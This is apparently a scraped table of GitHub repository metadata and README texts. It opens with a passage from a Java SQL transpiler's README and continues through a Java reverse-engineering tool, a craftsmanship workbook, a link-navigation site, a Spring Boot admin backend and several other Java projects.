ResultSetMetaData resultSetMetaData = new JSQLColumResolver(databaseMetaData).getResultSetMetaData(sqlStr);
System.out.println(resultSetMetaData.toString());

/*
""#"",""label"",""name"",""table"",""schema"",""catalog"",""type"",""type name"",""precision"",""scale"",""display size""
""1"",""salesid"",""salesid"",""d"",,""JSQLTranspilerTest"",""INTEGER"",""INTEGER"",""0"",""32"",""0""
""2"",""listid"",""listid"",""d"",,""JSQLTranspilerTest"",""INTEGER"",""INTEGER"",""0"",""32"",""0""
... (shortened) ...
""17"",""totalprice"",""totalprice"",""d"",,""JSQLTranspilerTest"",""DECIMAL"",""DECIMAL(8,2)"",""0"",""8"",""0""
""18"",""listtime"",""listtime"",""d"",,""JSQLTranspilerTest"",""TIMESTAMP"",""TIMESTAMP"",""0"",""0"",""0""
 */

```

## How to use

### Java Library

Maven Artifact with Snapshot support:
```xml
<repositories>
    <repository>
        <id>jsqltranspiler-snapshots</id>
        <snapshots>
            <enabled>true</enabled>
        </snapshots>
        <url>https://s01.oss.sonatype.org/content/repositories/snapshots/</url>
    </repository>
</repositories>

<dependency>
    <groupId>ai.starlake.jsqltranspiler</groupId>
    <artifactId>jsqltranspiler</artifactId>
    <version>0.7-SNAPSHOT</version>
</dependency>
```

Calling the Java class:
```java
import ai.starlake.transpiler.JSQLTranspiler;

String providedSQL=""SELECT Nvl(null, 1) a"";
String expectedSQL=""SELECT Coalesce(null, 1) a"";

String result = JSQLTranspiler.transpile(providedSQL, Dialect.AMAZON_REDSHIFT);
assertEquals(expectedSQL, result);
```

### Web API
```shell
curl -X 'POST'                                                                   \
  'https://starlake.ai/api/v1/transpiler/transpile?dialect=SNOWFLAKE'            \
  -H 'accept: text/plain'                                                        \
  -H 'Content-Type: text/plain'                                                  \
  -d 'SELECT Nvl(null, 1) a'
```

### Java Command Line Interface
```text
usage: java -jar JSQLTranspilerCLI.jar [-d <arg> | --any | --bigquery |
       --databricks | --snowflake | --redshift]      [-D <arg> | --duckdb]
       [-i <arg>] [-o <arg>] [-h]

 -d,--input-dialect <arg>    The SQL dialect to parse.
                             [ANY*, GOOGLE_BIG_QUERY, DATABRICKS,
                             SNOWFLAKE, AMAZON_REDSHIFT]
    --any                    Interpret the SQL as Generic Dialect
                             [DEFAULT].
    --bigquery               Interpret the SQL as Google BigQuery Dialect.
    --databricks             Interpret the SQL as DataBricks Dialect.
    --snowflake              Interpret the SQL as Snowflake Dialect.
    --redshift               Interpret the SQL as Amazon Snowflake
                             Dialect.
 -D,--output-dialect <arg>   The SQL dialect to write.
                             [DUCKDB*]
    --duckdb                 Write the SQL in the Duck DB Dialect
                             [DEFAULT].
 -i,--inputFile <arg>        The input SQL file or folder.
                             - Read from STDIN when no input file
                             provided.
 -o,--outputFile <arg>       The out SQL file for the formatted
                             statements.
                             - Create new SQL file when folder provided.
                             - Append when existing file provided.
                             - Write to STDOUT when no output file
                             provided.
 -h,--help                   Print the help synopsis.
```

### TimeKey substitution

The transpiler can substitute time key expressions such as `CURRENT_DATE` or `CURRENT_TIMESTAMP` with System's properties like

```java
System.setProperty(""CURRENT_TIMESTAMP"", ""2024-06-09 16:24:23.123"");
String expected = ""SELECT TIMESTAMP WITHOUT TIME ZONE '2024-06-09T16:24:23.123'"";
String actual = JSQLTranspiler.transpileQuery(""SELECT CURRENT_TIMESTAMP"", JSQLTranspiler.Dialect.ANY);

Assertions.assertThat(actual).isEqualTo(expected);
```

Alternatively parameters can be provided as `Map<String,Object>` (which would take precedence over any System's properties):

```java
String expected = ""SELECT TIME WITHOUT TIME ZONE '17:24:23.123'"";
String actual =
        JSQLTranspiler.transpileQuery(
                ""SELECT CURRENT_TIME""
                , JSQLTranspiler.Dialect.ANY
                , Map.of(""CURRENT_TIME"", ""17:24:23.123"")
        );

Assertions.assertThat(actual).isEqualTo(expected);
```
### Error Handling

In case the query refers to objects not existing in the provided database schema, the `JSQLColumnResolver` offers three modes:

- `STRICT` will let the resolution and lineage fail with an error message, which (first) object were not resolved
- `IGNORE` will simply ignore the node of the unresolvable object
- `LENIENT` will insert a ""virtual"" column node pointing on the unresolvable column of an unknown type

`STRICT` is the default error mode. It can be changed for the `JdbcMetaData` before passing it to the `JSQLColumnResolver` as shown in the code example below:

```java

String sqlStr =
            ""with \""mycte\"" as (\n""
            + ""    select invalidColumn, \""c\"".\""id\"", CURRENT_TIMESTAMP() as \""timestamp\""\n""
            + ""    from nonExistingTable \""o\"", \""sales\"".\""customers\"" \""c\""\n""
            + ""    where \""o\"".\""customer_id\"" = \""c\"".\""id\""\n""
            + "")\n""
            + ""select \""id\"", sum(\""amount\"") as sum, \""timestamp\""\n""
            + ""from \""mycte\""\n""
            + ""group by \""mycte\"".\""id\"", \""mycte\"".\""timestamp\"""";

// STRICT MODE will throw an Exception
ResultSetMetaData res =
        JSQLColumResolver.getResultSetMetaData(sqlStr, JdbcMetaData.copyOf(metaData.setErrorMode(JdbcMetaData.ErrorMode.STRICT)));

// LENIENT MODE will show an unresolvable node
ResultSetMetaData res =
        JSQLColumResolver.getResultSetMetaData(sqlStr, JdbcMetaData.copyOf(metaData.setErrorMode(JdbcMetaData.ErrorMode.LENIENT)));
String lineage =
        ""SELECT\n""
        + "" ├─mycte.id → sales.customers.id : Other\n""
        + "" ├─sum AS Function sum\n""
        + "" │  └─unresolvable\n""
        + "" └─mycte.timestamp → timestamp : Other\n"";

// IGNORE will skip and supress the unresolvable node
ResultSetMetaData res =
        JSQLColumResolver.getResultSetMetaData(sqlStr, JdbcMetaData.copyOf(metaData.setErrorMode(JdbcMetaData.ErrorMode.IGNORE)));
String lineage =
        ""SELECT\n""
        + "" ├─mycte.id → sales.customers.id : Other\n""
        + "" ├─sum AS Function sum\n""
        + "" └─mycte.timestamp → timestamp : Other\n"";
```
[More Details at JSQLColumnResolverTest](https://github.com/starlake-ai/jsqltranspiler/blob/f964a3e69e583abb637baa569cf96dd4b0350043/src/test/java/ai/starlake/transpiler/JSQLColumnResolverTest.java#L590)


### Unsupported features

Please refer to the [Feature Matrix](https://docs.google.com/spreadsheets/d/1jK6E1s2c0CWcw9rFeDvALdZ5wCshztdtlAHuNDaKQt4/edit?usp=sharing):

- DuckDB's Number and Currency formatting is very limited right now
- `Geography`, `JSon` and `XML` functions have not been implemented yet, but are planned
- `SELECT * REPLACE(...)` on DuckDB works very differently (replaces value instead of label)

## License

**JSQLTranspiler** is licensed under [**Apache License, Version 2.0**](https://www.apache.org/licenses/LICENSE-2.0).
","Rewrite BigQuery, Redshift, Snowflake and Databricks queries into DuckDB compatible SQL (with deep transformation of functions, data types and format characters) using Java.","bigquery,databricks,duckdb,query,redshift,rewrite,snowflake,transpiler,java",2024-04-02T09:46:05Z,2024-09-10T17:22:21Z,,0,4,13,209,1,1,28,7,2,NOASSERTION,Java
alura-es-cursos/2086-java-creando-tu-primera-API-y-conectandola-al-front-end,aula-01,,,,2024-04-03T00:19:20Z,2024-04-09T17:54:07Z,,0,2,0,11,0,4,27,7,0,,Java
firstfault/Trinity,master,"# Trinity 
Trinity is a powerful lightning-fast software reverse engineering suite for the Java bytecode architecture handling highly obfuscated binaries with ease.

![Screenshot](screenshots/trinity.png)

## Building
I highly recommend running Trinity from source:
```bash
git clone https://github.com/firstfault/Trinity.git
cd Trinity
./gradlew run
```
However, there are [binaries (usually outdated) available which you can get from here](https://github.com/firstfault/Trinity/releases).

## Features
- Databases
- Assembler
- Decompiler
- Renaming Code
- Cross-Referencing
- Constant Search
- Automatic Refactoring
- Deobfuscation

## Authors
- [@final](https://www.github.com/firstfault)

### Contributing
Contributions are massively appreciated. Please feel free to open an issue or pull request if anything you need is missing.

Please review the [planned features](PLANNED.md) before requesting a feature addition!

### Libraries Used
- [ImGui](https://github.com/ocornut/imgui) with [Bindings](https://github.com/SpaiR/imgui-java)
- [ObjectWeb ASM](https://asm.ow2.io/)
- Modified version of [Fernflower Decompiler](https://www.jetbrains.com/)

#### Who is this meant for?
Hackers, hobbyists, professionals, everyone is welcome.

#### Context
Originally Trinity started out as an obfuscator with an interactive interface. Over time, I began using it as a decompiler, and eventually it evolved into this awesome tool.",Software reverse engineering tool for Java,"bytecode,decompiler,disassembler,java,jvm,reverse-engineering,software-analysis,deobfuscation,obfuscation",2024-04-06T20:41:54Z,2024-06-21T22:24:49Z,,2,4,7,91,0,4,27,1,0,Apache-2.0,Java
advent-of-craft/2024-summer-craft-book,main,"# Summer Craft Book 2024

[![Our Discord](https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/E5Z9s9UKTS)
[![Linkedin](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/company/advent-of-craft)

[![License](https://img.shields.io/github/license/advent-of-craft/advent-of-craft.svg)](https://github.com/advent-of-craft/2024-summer-craft-book/blob/main/LICENSE)

This year, we are launching our version of the summer holiday workbook around `Software Craftsmanship` called the **Summer Craft Book**.

Please, download the PDF of the Summer Craft Book in this repository to get the most out of it.

## One theme a week

Each week, a specific theme is going to be examined. You will have information, theory,  exercises, games and resources to go further. 

Set aside a couple of hours a week to work on the subject. If you happen to have more time, a coding version will be available so you can dig into each exercise a bit longer.

We wouldn't want your craft skills to go to waste !

## About this repository

As with the Advent of Craft edition, the PDF of the Summer Craft Book comes with this github repository. Each exercise and most of the games are in it, so you could use the repository standalone.

We understand you could be busy in the summer and want to just do the practice so don't hesitate to do just that !

![Summer of Craft](docs/img/summer-of-craft.webp)

## The Book
You can grab your copy of our `Summer Craft Book` here:
- [Digital copy](https://drive.google.com/file/d/16BrF17jEMr6Sleonnq6xSafWMHA5_q1Y/view?usp=drive_link)
- [Printable version](https://drive.google.com/file/d/1yG6ALvJyf3y5LCWF38VlzW7D2APaGZRK/view?usp=sharing)

[![Summer Craft Book](docs/img/cover.webp)](https://drive.google.com/file/d/16BrF17jEMr6Sleonnq6xSafWMHA5_q1Y/view?usp=drive_link)

### Miro board
Alternatively, you can use the miro board template available [here](https://miro.com/app/board/uXjVK056f4o=/?share_link_id=201408685412) or by using the backup file available [here](https://drive.google.com/file/d/1laWnvAk8AnQ00QlaepzF3hTO2a8UR-Wg/view?usp=sharing).

[![Miro board](docs/img/miro-board.webp)](https://miro.com/app/board/uXjVK056f4o=/?share_link_id=201408685412)

## Summary
- [Week 1: Code Analysis.](/docs/01-code-analysis/week01.md)
- [Week 2: Object Calisthenics.](/docs/02-object-calisthenics/week02.md)
- [Week 3: Command Query Separation.](/docs/03-cqs/week03.md)
- [Week 4: Test Driven Development.](docs/04-tdd/week04.md)
- [Week 5: Accidental Complexity.](docs/05-complexity/week05.md)
- [Week 6: Legacy Code.](docs/06-legacy-code/week06.md)
- [Week 7: Property-based Testing.](docs/07-pbt/week07.md)

## Join us on Discord

To facilitate the communication and share your ideas around the different weeks, we invite you to join our `Discord` by simply clicking [here](https://discord.gg/E5Z9s9UKTS).

[![Discord Advent Of Craft](docs/img/discord.webp)](https://discord.gg/E5Z9s9UKTS)

## Available languages
Here are the supported programming languages: `java`, `C#`, `kotlin`, `typescript`.",Summer Craft Book 2024 🏖️,"code-analysis,command-query-separation,craftsmanship,legacy-code,object-calisthenics,property-based-testing,tdd,accidental-complexity",2024-04-05T19:13:00Z,2024-08-21T22:00:40Z,,0,3,0,104,0,7,27,1,0,MIT,Java
MichelliBrito/spring-ai,main,,,,2024-04-02T18:14:26Z,2024-04-02T18:13:51Z,,0,1,0,1,0,7,27,1,0,,Java
amaseng/myinvois-open-sdk,main,"# myinvois-open-sdk

Open source effort for MyInvois API.

# Disclaimer

While this software is provided under the terms of the Apache License, Version 2.0, it comes with no warranties or guarantees. Users are free to use, modify, and distribute the software according to the terms of the license. However, by using this software, users acknowledge that they do so at their own risk and assume all responsibility for any consequences that may arise from its use.

# Current Status

At the current state support: 

[JVM](jvm/) - Completed, login and validate TIN works, submit document to sandbox with and without signature is working.
",Open SDK for MyInvois API,,2024-04-16T01:33:25Z,2024-07-16T01:12:46Z,,0,10,5,59,0,4,26,6,0,Apache-2.0,Java
PennyJoly/linktre.cc,main,"# linktre.cc
linktre.cc节点导航站的开源版本。一个基于WebStack-Guns的二次开发加工的开源的网址导航网站项目，具备完整的前后台，可以拿来制作自己的网址导航。喜欢的话欢迎踊跃✨✨STAR✨✨<br/>
【[开源仓库工具大全linktre-tools](https://github.com/PennyJoly/linktre-tools)】<br/>
在原有项目基础上进行了如下优化完善：<br/>
1、新增了站点详情页功能；<br/>
2、更好的支持SEO优化；<br/>
3、支持模块化控制文案描述、广告加载；<br/>
4、支持每月免费10G容量的[**七牛云**](https://s.qiniu.com/faYbqa) 文件存储；<br/>
![首页](screen/1.png)
![首页](screen/5.png)



## 运行

克隆代码：

```shell
https://github.com/PennyJoly/linktre.cc.git
```

导入IDE，建议用IDEA打开项目目录，待maven下载完jar包


编辑配置：

```
resources目录下的 application.yml、application-dev.yml、application-prod.yml
```
```
该项目使用每月免费10G容量的七牛云作为存储系统，启动项目前请修改成你对应的路径地址。
上传文件：
内部图片文件路径都在linktre.cc/src/main/webapp/static/img/下
```

```
...
数据库采用mysql连接，用户名密码：
url: jdbc:mysql://你的mysql地址/guns?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=true&serverTimezone=GMT%2B8
username: mysql账号
password: mysql密码
...
```

新建数据库guns(utf8mb4)，导入数据：

```shell
guns.sql
```

maven打包或者IDE启动服务：

```shell
运行linktre.cc/run/start.sh 执行服务启动部署
可自行修改脚本内容中的端口号以及脚本存放位置，如：/home/service/site/ 以及运行参数。(默认以dev研发环境启动)
```

启动完成：http://localhost:8090



## 使用

后台地址：

本地后台： http://你的域名/admin

默认用户：admin

默认密码：111111

在线演示效果: https://linktre.cc


![主页](screen/2.png)

![分类](screen/3.png)

![网站](screen/4.png)

## SEO优化注意事项
```shell
文件夹下linktre.cc/src/main/webapp/WEB-INF.view/siteDetails/里的页面均根据数据site表的主键id作为页面名称。新添加页面时请注意保持数据主键id和该页面名称同步。
```

## 感谢

前端设计：[**WebStackPage**](https://github.com/WebStackPage/WebStackPage.github.io)

后台框架：[**Guns**](https://github.com/stylefeng/Guns)

开源框架：[**WebStack-Guns**](https://github.com/jsnjfz/WebStack-Guns)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**SpringBoot**

## 作者简介

各位老板你们好，近期咱们这边上新一款产品，不知道你们平常工作生活中，会不会用到chatgpt4.0，我们即将上新一个openai服务中转站，为了回馈各位老板，该产品价格力求做到全网最低，
最大能达到0.01人民币兑换100美元token的量，支持openai旗下所有产品。群每增加20人，我发放一个gpt4.0的token出来，感兴趣的老板可以扫描二维码进群了解详情

<img src=""https://img.bnyer.cn/site/wechatgroup.jpg"" alt=""img"" width=""400"">
<img src=""https://img.bnyer.cn/site/wechat.jpg"" alt=""img"" width=""400"">

这里是Kevin，一个🧰大厂裸辞上瘾的独立开发者。<br/>
✨连续创业多次building in public。 <br/>
🙈全平台获客工具[**『节点链接』**](https://links.bnyer.cn) 已上线。 <br/>
🔥[**『节点导航站』-AI工具|独立开发出海|自媒体|跨境电商|广告联盟』**](https://linktre.cc) 🌈现已上线 <br/>
✨ [**twitter(x)：Kevin不会写代码**](https://x.com/pennyjoly/status/1783305526119662061?s=46)  <br/>
✨ [**小红书：Kevin不会写代码**](https://www.xiaohongshu.com/user/profile/600d92e3000000000100bbde?xhsshare=CopyLink&appuid=600d92e3000000000100bbde&apptime=1714458726)  <br/>
✨ [**微信公众号：次元节点**](https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=Mzg2NjkwNzk5Mw==&scene=124#wechat_redirect)  <br/>
🎉不定时分享好用免费🆓工具及创业心得~ <br/>


## License

MIT
",linktre.cc节点导航站的开源版本。一个基于WebStack-Guns的二次开发加工的开源的网址导航网站项目，具备完整的前后台，可以拿来制作自己的网址导航。,,2024-04-30T08:57:59Z,2024-09-23T05:55:07Z,,0,1,0,15,0,2,26,1,0,MIT,Java
YunaBraska/streamline,main,"# StreamLine

StreamLine is an enhanced Java Stream API optimized for concurrent processing, leveraging the power of Project Loom's
virtual threads. Designed to provide superior performance in multithreaded environments, it simplifies the usage of
streams without the common pitfalls of resource management in standard Java streams.

[![Build][build_shield]][build_link]
[![Maintainable][maintainable_shield]][maintainable_link]
[![Coverage][coverage_shield]][coverage_link]
[![Issues][issues_shield]][issues_link]
[![Commit][commit_shield]][commit_link]
[![Dependencies][dependency_shield]][dependency_link]
[![License][license_shield]][license_link]
[![Central][central_shield]][central_link]
[![Tag][tag_shield]][tag_link]
[![Javadoc][javadoc_shield]][javadoc_link]
[![Size][size_shield]][size_shield]
![Label][label_shield]
![Label][java_version]

## Motivation

Traditional Java streams are powerful but also come with big limits cause of the shared ForkedJoinPool which is not
replaceable and also not programmatically configurable.
Java's parallel streams start blocking each other in concurrent environments, leading to performance bottlenecks.
Therefore, StreamLine was created to address these shortcomings.

### Benefits

- **High-Performance Streaming**: Takes full advantage of Project Loom's virtual threads for efficient non-blocking
  concurrency.
- **Simple API**: Offers a straightforward approach to parallel and asynchronous streaming operations.
- **Resource Management**: Designed to avoid typical issues related to stream resource management, ensuring cleaner and
  safer code.
- **Enhanced Scalability**: Performs exceptionally well under high-load conditions, scaling effectively across multiple
  cores.
- **Pure Java**: No external dependencies for a lightweight integration.
- **Functional Design**: Embraces modern Java functional paradigms.
- **No Reflection**: Ensures compatibility with GraalVM native images.

### Prerequisites

* Java 21 or later and for using Project Loom

### Usage

```java
import berlin.yuna.streamline.model.StreamLine;

public class Example {
    public static void main(final String[] args) {
        StreamLine.of(""one"", ""two"", ""three"")
            .threads(-1) // Use unlimited threads
            .forEach(System.out::println);
    }
}
```

With custom thread pool:

```java
import berlin.yuna.streamline.model.StreamLine;

import java.util.concurrent.ForkJoinPool;

public class Example {
    public static void main(final String[] args) {
        final ForkJoinPool executor = new ForkJoinPool();
        
        StreamLine.of(executor, ""one"", ""two"", ""three"")
            .threads(-1) // Use unlimited threads
            .forEach(System.out::println);
    }
}
```

### StreamLine Performance

Each method is tested with 10 concurrent streams including 10 tasks for every stream.
CPU cores: 10.

| Method                    | Time  |
|---------------------------|-------|
| Loop \[for]               | 1.86s |
| Java Stream \[Sequential] | 1.86s |
| Java Stream \[Parallel]   | 724ms |
| StreamLine \[Ordered]     | 118ms |
| StreamLine \[Unordered]   | 109ms |
| StreamLine \[2 Threads]   | 512ms |

### Limitations
* StreamLine is not compatible with Java 8
* StreamLine is mainly made for big data processing and not for small data
* The concurrent processing does not extend to operations returning type-specific streams
  like `IntStream`, `LongStream`, `DoubleStream`, `OptionalInt`, `OptionalLong`, `OptionalDouble`, etc.
* StreamLine has more terminal operations than the usual java stream due its simple design - not sure if this is an advantage or disadvantage ^^

[build_shield]: https://github.com/YunaBraska/streamline/workflows/MVN_RELEASE/badge.svg

[build_link]: https://github.com/YunaBraska/streamline/actions?query=workflow%3AMVN_RELEASE

[maintainable_shield]: https://img.shields.io/codeclimate/maintainability/YunaBraska/streamline?style=flat-square

[maintainable_link]: https://codeclimate.com/github/YunaBraska/streamline/maintainability

[coverage_shield]: https://img.shields.io/codeclimate/coverage/YunaBraska/streamline?style=flat-square

[coverage_link]: https://codeclimate.com/github/YunaBraska/streamline/test_coverage

[issues_shield]: https://img.shields.io/github/issues/YunaBraska/streamline?style=flat-square

[issues_link]: https://github.com/YunaBraska/streamline/commits/main

[commit_shield]: https://img.shields.io/github/last-commit/YunaBraska/streamline?style=flat-square

[commit_link]: https://github.com/YunaBraska/streamline/issues

[license_shield]: https://img.shields.io/github/license/YunaBraska/streamline?style=flat-square

[license_link]: https://github.com/YunaBraska/streamline/blob/main/LICENSE

[dependency_shield]: https://img.shields.io/librariesio/github/YunaBraska/streamline?style=flat-square

[dependency_link]: https://libraries.io/github/YunaBraska/streamline

[central_shield]: https://img.shields.io/maven-central/v/berlin.yuna/streamline?style=flat-square

[central_link]:https://search.maven.org/artifact/berlin.yuna/streamline

[tag_shield]: https://img.shields.io/github/v/tag/YunaBraska/streamline?style=flat-square

[tag_link]: https://github.com/YunaBraska/streamline/releases

[javadoc_shield]: https://javadoc.io/badge2/berlin.yuna/streamline/javadoc.svg?style=flat-square

[javadoc_link]: https://javadoc.io/doc/berlin.yuna/streamline

[size_shield]: https://img.shields.io/github/repo-size/YunaBraska/streamline?style=flat-square

[label_shield]: https://img.shields.io/badge/Yuna-QueenInside-blueviolet?style=flat-square

[gitter_shield]: https://img.shields.io/gitter/room/YunaBraska/streamline?style=flat-square

[gitter_link]: https://gitter.im/streamline/Lobby

[java_version]: https://img.shields.io/badge/java-21-blueviolet?style=flat-square
","Performant, Concurrent, simplified Stream API leveraging Project Loom's virtual threads for efficient concurrent processing. Optimized for multithreaded environments",,2024-04-25T09:07:45Z,2024-09-26T07:21:00Z,2024-09-26T07:21:00Z,13,1,0,30,1,0,25,1,5,Apache-2.0,Java
haitang1894/pea,main,"# 豌豆

## 简介

  项目采用SpringBoot3.2 +
JDK21、MyBatis-Plus、SpringSecurity安全框架等，适配 [soybean-admin](https://gitee.com/honghuangdc/soybean-admin)
开发的简单权限系统。


## **技术选型：**

| 依赖           | 版本     |
|--------------|--------|
| Spring Boot  | 3.2.4  |
| JDK          | 21     |
| Mybatis-Plus | 3.5.5  |
| hutool       | 5.8.25 |
| knife4j      | 4.5.0  |
| jwt          | 0.9.1  |
| mysql        | 8.0.33 |
| ...          | ...    |

## TODO 预计7月搞定

- [x] 优化补充菜单
- [ ] 优化日志管理
- [ ] 开发实现Google二次认证
- [ ] 实现按钮权限逻辑

## 后端部署

> - **GitHub仓库地址:** https://github.com/haitang1894/pea.git

- idea、eclipse需安装lombok插件，不然会提示找不到entity的get set方法
- 创建数据库pea，数据库编码为UTF-8
- 执行doc/sql/pea.sql文件，初始化数据
- 修改application-local.yml，更新MySQL账号和密码
- Eclipse、IDEA运行PeaApplication.java，则可启动项目
- Swagger注解路径：http://localhost:9528/doc.html

## 前端部署

> - **GitHub仓库地址:**  https://github.com/soybeanjs/soybean-admin.git

- 前端部署以及更换访问路径请看下面文档


- 前端部署方案：请参考 **[soybean-admin](https://docs.soybeanjs.cn/zh/)** 项目文档

- 前端部署完毕，修改配置就可以使用该后端

- 账号：Soybean，密码：123456

- 账号：admin，密码：123456

考虑到soybeanjs作者前端暂时没有对接后端，为了方便新手拉取代码后再添加接口,在本项目web目录整理了需要调整的前端代码
,找到位置直接覆盖即可,随后启动前端、后端就可以正常使用。下图是前端修改位置

![img.png](img.png)

## 注解

- 日志记录注解 @SysLogInterface
- 权限认证注解 @PreAuthorize(""@pre.hasPermission('system:user:add')"")
  目前 权限认证注解 开发并不完善,考虑前端暂未实现权限校验,没有进一步开发

## 6月1日更修内容:

1. 修改 添加/修改时候 创建人 创建人ID 不能获取问题
2. 更新sql修改 admin账号 密码变成 123456
  > update t_sys_user set `password` = '$2a$10$qbdPPGSnLm2oQwgLXyX8wOTgVZLHnm2pqS.We5.n6do3YfVxobCUy' where user_name = 'admin';
3. 添加用户管理、角色管理、菜单管理的添加/修改接口",,,2024-04-11T14:48:32Z,2024-06-19T14:05:40Z,,0,1,0,17,2,6,25,1,0,,Java
tiremoscode/curso-java-md-18,main,"## Curso de Java
",,,2024-04-24T17:28:52Z,2024-06-18T17:02:35Z,,0,23,65,178,0,29,24,1,0,,Java
elmfrain/cnmcu,master,"# CodeNode Micrcontrollers Mod

A mod that adds mos6502 based microcontrollers to the Minecraft so you can automate your redstone contraptions with assembly code.

**Note**: This mod is in Pre-Release (Alpha) stage so it may have bugs. If you find any bugs, please report them in the issues section.

![ScreenShot](./screenshots/Screenshot%20from%202024-04-28%2021-40-35.png)

## Table of Contents
* [Documentation](#documentation)
* [License](#license)

## Documentation

Detailed documentation can be found in here: [CodeNode Microcontrollers Mod Documentation](https://elmfrain.github.io/code-node-docs/). This documentation contains examples and detailed information about the architecture of the microcontrollers.

The instruction set of the 6502 can be referenced here: [Ultimate Commodore 64 Reference](https://www.pagetable.com/c64ref/6502)

Within the mod, you can view quick references by clicking `Code Editor` > `Help` > `Documentation`.

![ScreenShot](./screenshots/Screenshot%20from%202024-05-01%2016-52-53.png)

## License

This mod is licensed under the GNU General Public License v3.0. You can view the license [here](./LICENSE).

The assembler used in this mod, **vasm**, is licensed under their own license. You can view the license in section *1.2* of the [vasm manual](http://sun.hasenbraten.de/vasm/release/vasm.html).

**To clarify**: The license of the assembler, **vasm**, is not the same as the license of this mod. Rights are reserved to the respective owners of the assembler.",A mod that adds mos6502 based microcontrollers to the Minecraft so you can automate your redstone contraptions with assembly code.,,2024-04-12T07:06:44Z,2024-05-24T17:37:40Z,,7,2,23,206,2,2,24,1,1,GPL-3.0,Java
samuelevi87/hellow-backend-2024,main,,Repositório padrão do Hellow Backend,,2024-04-11T15:25:49Z,2024-07-04T16:23:07Z,,0,28,2,12,0,0,23,31,0,MIT,Java
nilsreichardt/gad24-tests,main,"# GAD 24 - Tests

This is a repository to collect JUnit Tests for GAD exercises at TUM in SoSe24. These tests have been written by students for students and are not part of the official course.

## Legal Status

> Es ist alles erlaubt, was die Lösung nicht verrät.

The so-called *Übungsleitung* will have an eye on this repository. But as long as the tests do not reveal the solution of the homework, this repository will tolerate them. To ensure the solution is not getting revealed, the tests should be Input/Output-Tests only.

Furthermore, there is no guarantee of the correctness of the tests. Neither the *Übungsleitung* nor any of the other tutors will contribute own tests. It is your own responsibility to validate the correctness and if necessary report bugs or even provide/contribute a fix for your fellow student.

### Examples

**correct**:
```java
// Test Area calculation
// Arrange
Rectangle r1 = new Rectangle(length: 4, width: 4)
// Act & Assert
assertEquals(16, r1.calculateArea());
```

**wrong!**:
```java
// Test Area calculation
// Arrange
Rectangle r1 = new Rectangle(length: 4, width: 6)
// Act & Assert
// Calculate using length * width             // <-- reveals the solution
assertEquals(4*6, r1.calculateArea()); // <-- reveals the solution
```

## Usage

https://github.com/nilsreichardt/gad24-tests/assets/24459435/6d3126b4-487d-4e40-bdc9-3b15a01170d7

1. Clone this repository
    ```shell
    git clone https://github.com/nilsreichardt/gad24-tests.git
    ```

2. Check for updates
    ```shell
    git pull
    ```

3. Copy the `test` directory to the root of your repository (next to `src`) and *not* inside your src folder
    ```
    ./your-gad-project
    ├───src
    ├───test
    └───...
    ```
    Or use the symlink instruction below.

4. Make sure in the `build.gradle` file `sourceSets`, `test` and `dependencies` look somewhat like that:
    ```groovy
    sourceSets {
        main {
            java {
                srcDir 'src'
            }
        }
        test {
            java {
                srcDirs = ['test']
            }
        }
    }

    test {
        useJUnitPlatform()
    }

    dependencies {
        testImplementation('org.junit.jupiter:junit-jupiter:5.9.0')
    }
    ```

5. Open the gradle tool window
6. Click reload
7. Run the tests via `tasks -> verification -> test` and check your mistakes

### Important note
As this is a student-driven project please keep in mind that mistakes can happen. If you think a test is wrong, please feel free to open an Issue:
[Open Issue](https://github.com/nilsreichardt/gad24-tests/issues)

### How to use symlinks (Advanced Users only)
**Windows:**
This has to be executed in the command line, run as administrator:
```shell
mklink /d \path\to\artemis-repository\test\gad \path\to\test-repository\aufgabe\test\gad
```

**Linux/MacOS:**
```shell
ln -s /path/to/test-repository/aufgabe/test/gad /path/to/artemis-repository/test/gad
```

## How to Contribute

1. Read our guidelines in our [CONTRIBUTING.md](https://github.com/nilsreichardt/gad24-tests/blob/main/CONTRIBUTING.md)
2. Fork Repository ([GitHub Documentation](https://docs.github.com/en/get-started/quickstart/fork-a-repo#forking-a-repository))
3. Add / edit tests under `<EXERCISE>/test/`
4. Ensure no solution or homework-code is getting revealed
5. Commit and push to your fork repository
6. Open a Pull Request to this repository ([GitHub Documentation](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests))
7. Wait until another student reviewed the PR

## Contributors
![Contributors](https://contrib.rocks/image?repo=nilsreichardt/gad24-tests)

## Helpful Links

- [PGDP WS 22/23 Tests](https://github.com/MaximilianAnzinger/pgdp2223-tests)
- [GAD SS23 Tests](https://github.com/JohannesStoehr/gad23-tests)
- [GAD SS22 Tests](https://github.com/MaximilianAnzinger/gad2022-tests)
- [Writing Tests using JUnit 5](https://junit.org/junit5/docs/current/user-guide/#writing-tests)
- [Learning Git with Bitbucket](https://www.atlassian.com/de/git/tutorials/learn-git-with-bitbucket-cloud)
- [Getting Started with GitHub](https://docs.github.com/en/get-started/quickstart/hello-world)

![Made with ersti tears](https://img.shields.io/badge/made%20with-tears-blue?style=svg)
",,,2024-04-19T08:46:54Z,2024-06-20T13:59:40Z,,0,3,13,17,0,4,23,10,0,MIT,Java
EmbarkXOfficial/Spring-Security-Course,main,"﻿# Welcome to Spring Security Course from Basic to Advance


GROW AS JAVA DEVELOPER
1. SIGNUP FOR MY SPRING BOOT FOR BEGINNERS COURSE: http://link.embarkx.com/spring-boot
2. LEARN JAVA WITH 60+ HOURS OF CONTENT: http://link.embarkx.com/java
3. MASTER INTELLIJ IDEA: http://link.embarkx.com/intellij
",,,2024-04-23T17:00:19Z,2024-05-14T07:30:29Z,,0,1,1,19,0,18,23,1,0,,Java
tiremoscode/curso-java-md-24,main,,,,2024-04-25T22:53:24Z,2024-06-10T23:49:19Z,,0,22,53,148,0,29,23,1,0,,Java
AvarionMC/graves,master,"![Graves logo](images/graves_logo.png)

# Acknowledgement

This plugin was made by Ranull, and imported via his [GitLab repository](https://gitlab.com/ranull/minecraft/graves). As
it wasn't updated in nearly 2 years, and no official source for a minecraft 1.20.2 and higher version, I decided to fork
it and keep it alive (😁 pun intended!).

Original code was released under GPLv3. So everything will be kept under the same license here.

# What is it?

